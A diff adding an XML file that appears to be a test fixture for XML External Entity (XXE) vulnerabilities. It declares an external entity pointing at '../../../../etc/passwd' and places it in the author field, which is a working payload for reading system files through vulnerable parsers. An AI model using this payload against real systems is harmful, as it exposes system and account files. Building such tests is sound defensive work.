@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE test [
+    <!ENTITY password SYSTEM "../../../../etc/passwd">
+    <!ENTITY password SYSTEM "../../../../etc/passwd">
+    <!ENTITY password SYSTEM "../../../../etc/passwd">
+    <!ENTITY password SYSTEM "../../../../etc/passwd">
+]>
+
+<test>
+    <title>XML External Entity (XXE) Test</title>
+    <description>This is a test for XML External Entity (XXE) vulnerabilities.</description>
+    <author>&password;</author>
+</test>
